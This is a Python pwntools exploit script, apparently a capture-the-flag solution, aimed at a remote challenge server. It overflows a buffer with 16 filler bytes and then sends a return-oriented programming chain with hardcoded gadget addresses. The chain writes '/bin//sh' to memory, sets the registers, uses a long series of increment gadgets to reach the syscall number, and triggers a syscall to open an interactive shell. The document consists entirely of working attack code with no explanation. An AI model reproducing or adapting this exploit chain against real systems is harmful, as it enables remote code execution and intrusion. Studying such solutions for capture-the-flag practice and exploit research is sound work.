from pwn import *

def exploit():
    p = remote("pwn.cyber.jawara.systems", 13372)

    pop_rsi_ret = 0x0000000000410183
    data = 0x00000000006b90e0
    syscall = 0x000000000047b52f
    pop_rax_ret = 0x00000000004155a4
    mov_qword_rsi_rax_ret = 0x000000000047f391
    xor_rax_rax_ret = 0x0000000000444b00
    pop_rdi_ret = 0x0000000000400696
    pop_rdx_ret = 0x00000000004497c5
    add_rax_1_ret = 0x0000000000474820

    payload = ''
    payload += 'A' * 16
    payload += p64(pop_rsi_ret) # pop rsi ; ret
    payload += p64(data) # @ .data
    payload += p64(pop_rax_ret) # pop rax ; ret
    payload += '/bin//sh'
    payload += p64(mov_qword_rsi_rax_ret) # mov qword ptr [rsi], rax ; ret
    payload += p64(pop_rsi_ret) # pop rsi ; ret
    payload += p64(data + 8) # @ .data + 8
    payload += p64(xor_rax_rax_ret) # xor rax, rax ; ret
    payload += p64(mov_qword_rsi_rax_ret) # mov qword ptr [rsi], rax ; ret
    payload += p64(pop_rdi_ret) # pop rdi ; ret
    payload += p64(data) # @ .data
    payload += p64(pop_rsi_ret) # pop rsi ; ret
    payload += p64(data + 8) # @ .data + 8
    payload += p64(pop_rdx_ret) # pop rdx ; ret
    payload += p64(data + 8) # @ .data + 8
    payload += p64(xor_rax_rax_ret) # xor rax, rax ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(add_rax_1_ret) # add rax, 1 ; ret
    payload += p64(syscall) # syscall

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()